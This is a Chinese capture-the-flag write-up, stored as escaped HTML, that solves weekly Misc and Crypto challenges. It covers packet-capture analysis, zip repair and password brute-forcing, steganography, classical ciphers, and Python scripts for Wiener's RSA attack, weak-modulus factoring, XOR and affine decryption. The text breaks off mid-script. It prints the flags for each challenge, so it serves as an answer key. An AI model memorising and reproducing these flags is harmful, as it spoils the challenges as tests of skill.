&lt;h3 id=&quot;week-1-liu-liang-sha-yu&quot;&gt;[Week 1]流量！鲨鱼！&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-1-liu-liang-sha-yu&quot; aria-label=&quot;Anchor link for: week-1-liu-liang-sha-yu&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;用 WireShark 打开后在过滤器中输入 &lt;code&gt;http.response.code==200&lt;&#x2F;code&gt; 可以得到所有成功访问的 http 请求。&lt;&#x2F;p&gt;
&lt;p&gt;通过一个一个看可以发现一个特殊的请求，如下图&lt;&#x2F;p&gt;
&lt;p&gt;可以发现这是请求 flag 并且将 flag 以 base64 编码的形态输出，通过将值进行 base64 解码即可得到 flag。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;flag{Wri35h4rk_1s_u53ful_b72a609537e6}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-1-ya-suo-bao-men&quot;&gt;[Week 1]压缩包们&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-1-ya-suo-bao-men&quot; aria-label=&quot;Anchor link for: week-1-ya-suo-bao-men&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;通过 binwalk 可以知道这是个 zip 压缩包，用 010 打开后发现缺少了文件头，需要进行修改，如下图。&lt;&#x2F;p&gt;
&lt;p&gt;修改后将后缀名修改为 zip ，解压得到 flag.zip 但打开压缩包会提示压缩包数据错误 - 该文件已损坏，再看看全局方式位标记是否有错。&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s?__biz=MzAwNDcwMDgzMA==&amp;amp;mid=2651042332&amp;amp;idx=7&amp;amp;sn=ff5bb33bb0f49470a9140976d9ced3fa&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;通过 010 可以看到压缩源文件数据的全局方式位标记为 &lt;code&gt;09 00&lt;&#x2F;code&gt; ，压缩源文件目录区的全局方式位标记 &lt;code&gt;00 00&lt;&#x2F;code&gt; ，将压缩源文件目录区的全局方式位标记也修改为 &lt;code&gt;09 00&lt;&#x2F;code&gt; 再打开压缩包发现压缩包正常了。&lt;&#x2F;p&gt;
&lt;p&gt;在压缩包注释中存在一串 base64 编码内容如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;SSBsaWtlIHNpeC1kaWdpdCBudW1iZXJzIGJlY2F1c2UgdGhleSBhcmUgdmVyeSBjb25jaXNlIGFuZCBlYXN5IHRvIHJlbWVtYmVyLg==
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;解码内容如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;I like six-digit numbers because they are very concise and easy to remember.
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;说明密码应该为 6 个数字，用 ARCHPR 进行爆破即可得到密码为 &lt;code&gt;232311&lt;&#x2F;code&gt; ，解压后即可得到 flag&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;flag{y0u_ar3_the_m4ter_of_z1111ppp_606a4adc}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-1-kong-bai-ge&quot;&gt;[Week 1]空白格&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-1-kong-bai-ge&quot; aria-label=&quot;Anchor link for: week-1-kong-bai-ge&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;使用 VSCode 打开可以发现这是由 &lt;code&gt;换行符&lt;&#x2F;code&gt; 、&lt;code&gt;制表符&lt;&#x2F;code&gt; 和 &lt;code&gt;空格&lt;&#x2F;code&gt; 组成的内容，通过百度发现是 whitespace 语言。&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;https:&#x2F;&#x2F;www.w3cschool.cn&#x2F;tryrun&#x2F;runcode?lang=whitespace&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;通过在线工具即可得到 flag 如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;flag{w3_h4v3_to0_m4ny_wh1t3_sp4ce_2a5b4e04}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-1-yin-mi-de-yan-jing&quot;&gt;[Week 1]隐秘的眼睛&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-1-yin-mi-de-yan-jing&quot; aria-label=&quot;Anchor link for: week-1-yin-mi-de-yan-jing&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;使用 SilentEye 进行 Decode 即可得到 flag，密钥用的是默认的。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;flag{R0ck1ng_y0u_63b0dc13a591}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-2-xin-jian-wordwen-dang&quot;&gt;[Week 2]新建Word文档&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-2-xin-jian-wordwen-dang&quot; aria-label=&quot;Anchor link for: week-2-xin-jian-wordwen-dang&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;http:&#x2F;&#x2F;hi.pcmoe.net&#x2F;buddha.html&lt;&#x2F;p&gt;
&lt;h2 id=&quot;crypto&quot;&gt;Crypto&lt;a class=&quot;zola-anchor&quot; href=&quot;#crypto&quot; aria-label=&quot;Anchor link for: crypto&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;week-1-brainfuck&quot;&gt;[Week 1]brainfuck&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-1-brainfuck&quot; aria-label=&quot;Anchor link for: week-1-brainfuck&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;密文如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;++++++++[&amp;gt;&amp;gt;++&amp;gt;++++&amp;gt;++++++&amp;gt;++++++++&amp;gt;++++++++++&amp;gt;++++++++++++&amp;gt;++++++++++++++&amp;gt;++++++++++++++++&amp;gt;++++++++++++++++++&amp;gt;++++++++++++++++++++&amp;gt;++++++++++++++++++++++&amp;gt;++++++++++++++++++++++++&amp;gt;++++++++++++++++++++++++++&amp;gt;++++++++++++++++++++++++++++&amp;gt;++++++++++++++++++++++++++++++&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;-]&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;++++++.&amp;gt;----.&amp;lt;-----.&amp;gt;-----.&amp;gt;-----.&amp;lt;&amp;lt;&amp;lt;-.&amp;gt;&amp;gt;++..&amp;lt;.&amp;gt;.++++++.....------.&amp;lt;.&amp;gt;.&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;+++.&amp;gt;&amp;gt;&amp;gt;&amp;gt;+.&amp;lt;&amp;lt;&amp;lt;+++++++.&amp;gt;&amp;gt;&amp;gt;+.&amp;lt;&amp;lt;&amp;lt;-------.&amp;gt;&amp;gt;&amp;gt;-.&amp;lt;&amp;lt;&amp;lt;+.+++++++.--..&amp;gt;&amp;gt;&amp;gt;&amp;gt;---.-.&amp;lt;&amp;lt;&amp;lt;&amp;lt;-.+++.&amp;gt;&amp;gt;&amp;gt;&amp;gt;.&amp;lt;&amp;lt;&amp;lt;&amp;lt;-------.+.&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;++.
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;https:&#x2F;&#x2F;www.splitbrain.org&#x2F;services&#x2F;ook&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;flag{Oiiaioooooiai#b7c0b1866fe58e12}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-1-caesar-s-secert&quot;&gt;[Week 1]Caesar’s Secert&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-1-caesar-s-secert&quot; aria-label=&quot;Anchor link for: week-1-caesar-s-secert&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;密文如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;kqfl{hf3x4w&amp;#39;x_h1umjw_n5_a4wd_3fed}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;https:&#x2F;&#x2F;www.dcode.fr&#x2F;caesar-cipher&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;flag{ca3s4r&amp;#39;s_c1pher_i5_v4ry_3azy}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-1-fence&quot;&gt;[Week 1]Fence&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-1-fence&quot; aria-label=&quot;Anchor link for: week-1-fence&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;密文如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;fa{ereigtepanet6680}lgrodrn_h_litx#8fc3
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;栅栏密码，使用 CyberChef 可以解出来&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;#recipe=Rail_Fence_Cipher_Decode(2,0)&amp;amp;input=ZmF7ZXJlaWd0ZXBhbmV0NjY4MH1sZ3JvZHJuX2hfbGl0eCM4ZmMz
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;flag{reordering_the_plaintext#686f8c03}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-1-vigenere&quot;&gt;[Week 1]Vigenère&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-1-vigenere&quot; aria-label=&quot;Anchor link for: week-1-vigenere&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;密文如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;pqcq{qc_m1kt4_njn_5slp0b_lkyacx_gcdy1ud4_g3nv5x0}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;https:&#x2F;&#x2F;www.dcode.fr&#x2F;vigenere-cipher&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;维吉尼亚密码解密，将密文丢进上述链接中，并设置&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Knowing a plaintext word: flag{
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以发现当 Key 前三位为 &lt;code&gt;KFC&lt;&#x2F;code&gt; 时存在 &lt;code&gt;flag{&lt;&#x2F;code&gt; ，故尝试让 Key 就等于 &lt;code&gt;KFC&lt;&#x2F;code&gt; ，发现就是 flag。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;flag{la_c1fr4_del_5ign0r_giovan_batt1st4_b3ll5s0}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-1-babyencoding&quot;&gt;[Week 1]babyencoding&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-1-babyencoding&quot; aria-label=&quot;Anchor link for: week-1-babyencoding&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;密文如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;part 1 of flag: ZmxhZ3tkYXp6bGluZ19lbmNvZGluZyM0ZTBhZDQ=
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;part 2 of flag: MYYGGYJQHBSDCZJRMQYGMMJQMMYGGN3BMZSTIMRSMZSWCNY=
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;part 3 of flag: =8S4U,3DR8SDY,C`S-F5F-C(S,S&amp;lt;R-C`Q9F8S87T`
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;前两个用 CyberChef 可以一把梭，结果如下。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;part 1 of flag: flag{dazzling_encoding#4e0ad4
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;part 2 of flag: f0ca08d1e1d0f10c0c7afe422fea7
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;第三部分使用的是 UUEncode 编码&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;http:&#x2F;&#x2F;www.atoolbox.net&#x2F;Tool.php?Id=731&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;解密后可以得到第三部分&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;part 3 of flag: c55192c992036ef623372601ff3a}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-1-small-d&quot;&gt;[Week 1]Small d&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-1-small-d&quot; aria-label=&quot;Anchor link for: week-1-small-d&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;blockquote&gt;
&lt;p&gt;https:&#x2F;&#x2F;github.com&#x2F;pablocelayes&#x2F;rsa-wiener-attack&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;题目中的 e 很大，说明 d 就会很小，通过 Wiener 攻击来解出 d。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from Crypto.Util.number import long_to_bytes
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from RSAwienerHacker import hack_RSA
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;e = 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;n = 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;c = 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;d = hack_RSA(e, n)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(d)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;m = pow(c, d, n)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(long_to_bytes(m))
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-1-babyrsa&quot;&gt;[Week 1]babyrsa&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-1-babyrsa&quot; aria-label=&quot;Anchor link for: week-1-babyrsa&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;blockquote&gt;
&lt;p&gt;题目描述：很容易分解的n&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;factordb.com&#x2F;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;题目描述中给出 hint ，通过 factordb 分解 n ，可以得到以下数组。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;array_p = [2217990919, 2338725373, 2370292207, 2463878387, 2706073949, 2794985117, 2804303069, 2923072267, 2970591037, 3207148519, 3654864131, 3831680819, 3939901243, 4093178561, 4278428893]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;分解所得均为素数，通过计算出 phi 即可得出结果。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import gmpy2
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from Crypto.Util.number import long_to_bytes, isPrime
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;n = 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;e = 65537
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;c = 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;array_p = [2217990919, 2338725373, 2370292207, 2463878387, 2706073949, 2794985117, 2804303069, 2923072267, 2970591037, 3207148519, 3654864131, 3831680819, 3939901243, 4093178561, 4278428893]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;phi = 1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;for p in array_p:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    if isPrime(p):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        phi *= (p - 1)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    else:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        exit(1)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;d = gmpy2.invert(e, phi)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;m = pow(c, d, n)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(long_to_bytes(m))
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-1-babyxor&quot;&gt;[Week 1]babyxor&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-1-babyxor&quot; aria-label=&quot;Anchor link for: week-1-babyxor&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from secret import *
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ciphertext = []
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;for f in flag:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    ciphertext.append(f ^ key)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(bytes(ciphertext).hex())
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;知道明文前五位为 &lt;code&gt;flag{&lt;&#x2F;code&gt; ，通过异或密文前五位来得出 &lt;code&gt;key&lt;&#x2F;code&gt; ，python 脚本如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ciphertext_hex = &amp;quot;e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ciphertext = bytes.fromhex(ciphertext_hex)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;known_plaintext = b&amp;quot;flag{&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;partial_key = [ciphertext[i] ^ known_plaintext[i] for i in range(5)]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(&amp;quot;Partial key:&amp;quot;, bytes(partial_key))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# Partial key: b&amp;#39;\x8f\x8f\x8f\x8f\x8f&amp;#39;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以得出 key 为 &lt;code&gt;\x8f&lt;&#x2F;code&gt; ，通过遍历异或整串密文就可以得到 flag，脚本如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ciphertext_hex = &amp;quot;e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ciphertext = bytes.fromhex(ciphertext_hex)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;key = int.from_bytes(b&amp;#39;\x8f&amp;#39;, &amp;#39;big&amp;#39;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(bytes([ciphertext[i] ^ key for i in range(36)]))
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-1-affine&quot;&gt;[Week 1]Affine&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-1-affine&quot; aria-label=&quot;Anchor link for: week-1-affine&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from flag import flag, key
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;modulus = 256
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ciphertext = []
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;for f in flag:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    ciphertext.append((key[0]*f + key[1]) % modulus)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(bytes(ciphertext).hex())
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过将明文的每个字符与 &lt;code&gt;key[0]&lt;&#x2F;code&gt; 相乘再加上 &lt;code&gt;key[1]&lt;&#x2F;code&gt; 模 256即可得到密文，因此把过程倒过来即可得到 flag。&lt;&#x2F;p&gt;
&lt;p&gt;加密过程: $(key[0] * f + key[1])\ mod\ 256$&lt;&#x2F;p&gt;
&lt;p&gt;因为进行模运算，逆过来需要先求出逆元，通过求出逆元就可以逆推得出 flag。&lt;&#x2F;p&gt;
&lt;p&gt;解密过程: $key[0]^{-1} * (c-key[1])\ mod\ 256 $&lt;&#x2F;p&gt;
&lt;p&gt;根据已知明文 &lt;code&gt;flag{&lt;&#x2F;code&gt; 爆破出逆元后通过解出的 &lt;code&gt;key[0]&lt;&#x2F;code&gt; 和 &lt;code&gt;key[1]&lt;&#x2F;code&gt; 代入求解即可，脚本如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def mod_inverse(a, m):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    for x in range(1, m):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if (a * x) % m == 1:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            return x
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    return None
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ciphertext = bytes.fromhex(&amp;quot;dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064&amp;quot;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;known_text = b&amp;quot;flag{&amp;quot;
